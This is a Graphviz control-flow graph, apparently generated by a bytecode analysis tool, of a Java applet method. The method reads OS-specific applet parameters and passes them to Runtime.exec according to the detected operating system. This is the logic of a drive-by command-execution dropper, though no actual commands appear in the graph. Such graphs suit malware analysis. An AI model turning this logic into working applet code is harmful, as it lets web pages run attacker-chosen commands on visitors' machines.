digraph "" {
    "r0 := @this: Client"
    "load.r r0"
    "r0 := @this: Client"->"load.r r0";
    "push \"windows1\""
    "load.r r0"->"push \"windows1\"";
    "virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>"
    "push \"windows1\""->"virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>";
    "store.r r7"
    "virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>"->"store.r r7";
    "store.r r7"->"load.r r0";
    "push \"windows2\""
    "load.r r0"->"push \"windows2\"";
    "push \"windows2\""->"virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>";
    "store.r r8"
    "virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>"->"store.r r8";
    "store.r r8"->"load.r r0";
    "push \"linux1\""
    "load.r r0"->"push \"linux1\"";
    "push \"linux1\""->"virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>";
    "store.r r9"
    "virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>"->"store.r r9";
    "store.r r9"->"load.r r0";
    "push \"linux2\""
    "load.r r0"->"push \"linux2\"";
    "push \"linux2\""->"virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>";
    "store.r r10"
    "virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>"->"store.r r10";
    "store.r r10"->"load.r r0";
    "push \"unix1\""
    "load.r r0"->"push \"unix1\"";
    "push \"unix1\""->"virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>";
    "store.r r11"
    "virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>"->"store.r r11";
    "store.r r11"->"load.r r0";
    "push \"unix2\""
    "load.r r0"->"push \"unix2\"";
    "push \"unix2\""->"virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>";
    "store.r r0"
    "virtualinvoke <Client: java.lang.String getParameter(java.lang.String)>"->"store.r r0";
    "push \"os.name\""
    "store.r r0"->"push \"os.name\"";
    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
    "push \"os.name\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"
    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String toLowerCase()>";
    "store.r r13"
    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"->"store.r r13";
    "load.r r13"
    "store.r r13"->"load.r r13";
    "push \"win\""
    "load.r r13"->"push \"win\"";
    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"
    "push \"win\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
    "iflt load.r r13"
    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"iflt load.r r13";
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
    "iflt load.r r13"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
    "load.r r7"
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r7";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
    "load.r r7"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
    "pop"
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
    "load.r r8"
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r8";
    "load.r r8"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
    "goto load.r r13"
    "pop"->"goto load.r r13";
    "goto load.r r13"->"load.r r13";
    "push \"mac\""
    "load.r r13"->"push \"mac\"";
    "push \"mac\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"iflt load.r r13";
    "iflt load.r r13"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
    "load.r r11"
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r11";
    "load.r r11"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r0";
    "load.r r0"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
    "pop"->"goto load.r r13";
    "goto load.r r13"->"load.r r13";
    "push \"lin\""
    "load.r r13"->"push \"lin\"";
    "push \"lin\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
    "iflt return"
    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"iflt return";
    "iflt return"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
    "load.r r9"
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r9";
    "load.r r9"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
    "load.r r10"
    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r10";
    "load.r r10"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
    "goto return"
    "pop"->"goto return";
    "return"
    "goto return"->"return";
    "virtualinvoke <java.io.IOException: void printStackTrace()>"
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.io.IOException: void printStackTrace()>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.io.IOException: void printStackTrace()>";
    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.io.IOException: void printStackTrace()>";
}
